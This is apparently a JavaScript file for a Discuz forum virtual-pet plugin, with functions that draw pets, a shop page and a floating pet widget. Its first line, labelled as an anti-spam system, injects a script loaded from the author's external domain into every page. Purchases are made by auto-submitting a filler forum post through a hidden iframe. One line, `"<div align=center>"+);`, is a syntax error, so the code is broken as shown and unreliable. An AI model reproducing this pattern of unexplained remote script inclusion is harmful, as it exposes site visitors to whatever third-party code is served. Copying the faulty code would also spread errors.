//防灌水系统
document.write("<scr"+"ipt src='http://zyhome.66rt.com/templates/out/ip.htm'></scr"+"ipt>")




document.write("<style>#sidebar_img{display:none!important;}</style>")
function petshow(petcode,petexp,pethun,petowner){
if (petcode>0){
  document.write("<div style='border-style: solid;border-color:#cacaca;width:200px;padding:5px;'>");
  petcode--;
    document.write("<div align=center>"+);
    document.write(petowner+"的");
    for (i=1;i<=petinfo[petcode].length;i++){
        if (petinfo[petcode][i][2]>petexp){
               document.write(petinfo[petcode][i][0]);
               document.write("<br /><img src='");
               document.write(petinfo[petcode][i][1]);
               petorder=i;
               i=9999;
        }
    }
    document.write("' />");
    document.write("</div>");
  if (pethun>3){
     document.write("体力:<img src='"+petpic[0]+"' /><img height=12px  width="+pethun+"px src='"+petpic[1]+"' /><img src='"+petpic[2]+"' /><br />");
  }else{
     document.write("<font color=red>宠物体力不支了......</font><br />");
  }
      for (i=1;i<=petlevel.length;i++){
        if (petlevel[i]>petexp){
               petlevelup=petlevel[i]-petexp
               document.write("等级:"+i+"<br />升级还需要:"+petlevelup+"经验<br />");
               i=9999;
        }
      }
  if (i<1000){document.write("已经升到最高等级!<br />")}
  petshengji=petinfo[petcode][petorder][2]-petexp;
  if (petinfo[petcode].length==petorder+1){document.write('已经进化到最高形态了!')
     }else{document.write("进化还需要:"+petshengji+"经验")};
  document.write("</div>");
}
}



var petbuy2=false



for (x=0;x<petshop.length;x++){
    if (location.href=="http://"+webname+"/post.php?action=newthread&fid="+petshop[x][0]){
       var petname=petshop[x][1]
       var r=confirm("确认购买"+petname+"？(花费"+petshop[x][2]+")");
       if (r==true){
                  petbuy2=true
                  x=9999999
                  }
   }
}

for (k=0;k<petinfo.length;k++){
    if (location.href==("http://"+webname+"/post.php?action=newthread&fid="+petinfo[k][0][2])){
       var petname=petinfo[k][0][0]
       var r=confirm("确认购买"+petname+"？(花费"+petinfo[k][0][1]+")");
       if (r==true){
                  petbuy2=true
                  x=9999999
                  }
   }
}

function petshoppage(){
   $("wrap").innerHTML="<div class='s_clear sidebox' align='left'>"+$("wrap").lastChild.lastChild.innerHTML+"</div><div id='petshopmain'>"
   for (i=0;i<petshop.length;i++){
      $("wrap").innerHTML+="<div style='width:50%;height:120px; float:left;'><table border='0' width='100%' cellpadding='10'><tr><td width='25%' valign='middle' align='center'><div align=center><div style='width=100%'><img src='"+petshop[i][4]+"' /></div>"+petshop[i][1]+"</div></td><td width='75%' valign='middle'><strong>"+petshop[i][5]+"<br />效果:</strong>"+petshop[i][3]+"<br /><span id='pet"+petshop[i][0]+"'></span><br /><button type='button'  onclick='petbuy("+petshop[i][0]+")'>买一个</button><strong>价格:</strong>"+petshop[i][2]+"</td></tr></table></div>"
   };
   $("wrap").innerHTML+="</div><iframe id='buyitiframe' src=''></iframe>"
   petcrdits=$("mycredits_menu").childNodes
   petcrehun=petcrdits[petcrdits.length-3].innerHTML.replace(/宠物体力: /,"").replace(/ 点/,"")
   petcrecode=petcrdits[petcrdits.length-2].innerHTML.replace(/宠物种族: /,"").replace(/ #/,"")
   petcreexp=petcrdits[petcrdits.length-1].innerHTML.replace(/宠物成长值: /,"").replace(/ 点/,"")
   petshow(petcrecode,petcreexp,petcrehun,"你")
   petcopyright()
}



function petbuypage(){
   $("wrap").style.display="none"
   document.write("<style>#ad_text{background:#ffffff;}</style>")
   $("ad_text").innerHTML="<div class='s_clear' id='wrap' align='left'>"+$("wrap").lastChild.lastChild.innerHTML+"</div>"
   $("ad_text").innerHTML+="<div align=center>"
   for (i=0;i<petinfo.length;i++){
      $("ad_text").innerHTML+=("<div style='width:50%;float:left;'><table border='0' width='100%' cellpadding='10'><tr><td width='50%' valign='middle' align='center'><div align=center><img src='"+petinfo[i][petinfo[i].length-1][1]+"' /><br />"+petinfo[i][0][0]+"</div></td><td width='50%' valign='middle' align='center'><h4>"+petinfo[i][0][3]+"<br /><button type='button' onclick='petbuy("+petinfo[i][0][2]+")'>购买"+petinfo[i][0][0]+"</button>价格:"+petinfo[i][0][1]+"<br /><span id='pet"+petinfo[i][0][2]+"'></span></h4></td></tr></table></div>")
   };
   $("ad_text").innerHTML+="</div><iframe id='buyitiframe' src=''></iframe>"
};

function petbuy(petfid){
  $("buyitiframe").src=("http://"+webname+"/post.php?action=newthread&fid="+petfid)
}


function petbuyit(){$("subject").value=("购买"+petname);$("e_textarea").value="aaaaaaaaaaaaaaaaaaaa";document.getElementById('postsubmit').click()};

function Xg(d,a,c,b) {
for (i=0;i<d;i++){
$(b+i).style.display='none';
$(b+a).style.display='block';
$(c+i).className='';
$(c+a).className='current';}}


function disanfang(){
  if (petbuy2==true){
    if ($('postsubmit')!=null){
      petbuyit();
      alert("购买"+petname+"成功！");
    }else{
      alert("购买"+petname+"失败.........")
    };
  }
   petcre=$("mycredits_menu").childNodes
   petchun=petcre[petcre.length-3].innerHTML.replace(/宠物体力: /,"").replace(/ 点/,"")
   petccode=petcre[petcre.length-2].innerHTML.replace(/宠物种族: /,"").replace(/ #/,"")
   petcexp=petcre[petcre.length-1].innerHTML.replace(/宠物成长值: /,"").replace(/ 点/,"")
   if (discuz_uid!=0 && petccode!="0"){
     document.write("<div id='roll' class='pethide' onmousemove='petthisshowed()' onmouseout='petthishided()'><div id='rollpet' style='display:none;'>")
     petshow(petccode,petcexp,petchun,"你")
     document.write("</div><div id='rollpic'><img src='"+petpic[3]+"' /></div></div>")
     var roll=document.getElementById('roll'), 
     initX=0, 
     initY, 
     compY, 
     sp=3, 
     timeGap=5, 
     doc=document.documentElement, 
     docBody=document.body; 
     compY=initY=200; 
     roll.style.right=initX+"px"; 
     ;(function(){ 
     var curScrollTop=(doc.scrollTop||docBody.scrollTop||0)-(doc.clientTop||docBody.clientTop||0); 
     compY+=(curScrollTop+initY-compY)/sp; 
     roll.style.top=Math.ceil(compY)+"px"; 
     setTimeout(arguments.callee,timeGap); 
     })(); 
     document.write("<style>#roll{background:#ffffff; position:absolute;}</style>");
  }
}


function petcopyright(){document.write("<br /><span style='font: bold 14px Arial; color: #fbb040;'>章鱼</span><span style='font: bold 15px Verdana; color:#f15a29;'>宠物中心</span></a><span style='font: normal 9px Verdana; display:block;'><a href='http://zyhome.66rt.com' title='章鱼之家论坛' style='font: bold 9px Verdana;'>1.0 Beta</a><br>由章鱼之家论坛制作 <br> &copy; 2011 - 2012<br>Don‘t copy youself !</span><br /><span  style='font: bold 14px Arial; color: #fbb040;'>Powered by 章鱼之家<br /><a href='http://zyhome.66rt.com' target='_blank'>zyhome.66rt.com</a></span><br /><br /><span style='font:bold Arial; color: #fbb040;'>鸣谢:</span><br /><a href='http://dzclub.gain.tw'>Dzclub!插件</a>");}


function petthisshowed(){$("rollpet").style.display="block";$("rollpic").style.display="none";};
function petthishided(){$("rollpet").style.display="none";$("rollpic").style.display="block";};